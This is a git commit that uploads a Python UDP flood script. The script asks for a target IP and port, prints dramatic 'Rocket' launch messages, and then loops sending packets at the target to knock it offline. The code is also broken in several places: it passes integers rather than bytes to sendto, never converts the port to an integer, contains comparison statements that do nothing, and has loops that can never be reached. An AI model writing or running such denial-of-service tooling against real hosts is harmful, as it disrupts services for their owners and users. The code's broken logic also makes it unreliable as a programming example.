19a8d1656584eb3e0c4b36188a9e7ba28eb224b8
Revamp-MTT <132065512+Revamp-MTT@users.noreply.github.com>
2023-05-05 11:02:04 +0700

    Add files via upload
    Signed-off-by: Revamp-MTT <132065512+Revamp-MTT@users.noreply.github.com>

---
+++ Deagle3233K.py
@@ -0,0 +1,97 @@
+#Author WHITE L'
+import socket
+import os
+import random
+import time
+import sys
+
+B = '\033[1m'
+R = '\033[31m'
+N = '\033[0m'
+
+white = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+bytes = random._urandom(32000)
+sent = random._urandom(166660)
+ping = random._urandom(16693)
+random = random._urandom(166663)
+
+os.system("clear")
+ip = input("[+] Target's IP : ")
+port = input("[+] Port Target : ")
+sent = input("[+] Sent Packet 1-200000 : ")
+ping = input("[+] ping Server 1-500000 : ")
+random = input("[+] random Server packet : ")
+bytes = input("[+] bytes server 1-500000 : ")
+
+os.system("clear")
+print("Loading Technick....?")
+time.sleep(5)
+print("Rocket Aktin wait...")
+time.sleep(3)
+print("Rocket 18RVP✓")
+time.sleep(2)
+print("Rocket 200✓")
+time.sleep(5)
+print("Meluncur✓✓✓")
+os.system("clear")
+time.sleep(3)
+while True:
+    sent = 0
+    for bytes in range(1, 65534):
+        white.sendto(bytes, (ip, port))
+      
+time.sleep(3)
+while True:
+    sent = 0
+    for bytes in range(1, 65534):
+        white.sendto(bytes, (ip, port))
+        
+time.sleep(3)
+while True:
+    sent = 0
+    for bytes in range(1, 65534):
+        white.sendto(bytes, (ip, port))
+        
+time.sleep(3)
+while True:
+    sent = 0
+    for bytes in range(1, 65534):
+        white.sendto(bytes, (ip, port))
+        
+    sent = 0
+    for bytes in range(1, 65534):
+        white.sendto(bytes, (ip, port))
+        
+while True:
+    sent = 0
+    for random in range(1, 65534):
+        white.sendto(random, (ip, port))
+        
+while True:
+    sent = 0
+    for ping in range(1, 65534):
+         white.sendto(ping, (ip, port))
+        
+while True:
+    sent = 0
+    for random in range(1, 65534):
+        white.sendto(random, (ip, port))
+        
+while True:
+    sent = 0
+    for random in range(1, 65534):
+        white.sendto(random, (ip, port))
+      
+while True:
+    sent = 0
+    for ping in range(1, 65534):
+        white.sendto(random, (ip, port))
+        sent = sent + 1
+        sent == 65534
+        port = port + 1
+        port == 65534
+        ping = ping + 1
+        ping == 65534
+        print("\033[1;91mSend \033[1;32m%s \033[1;91m Mengirim Packet \033[1;32m%s \033[1;91mThrough port \033[1;32m%s " % (sent, ip, port))
+
+print("\033[1;92mAttack finished\033[0m")
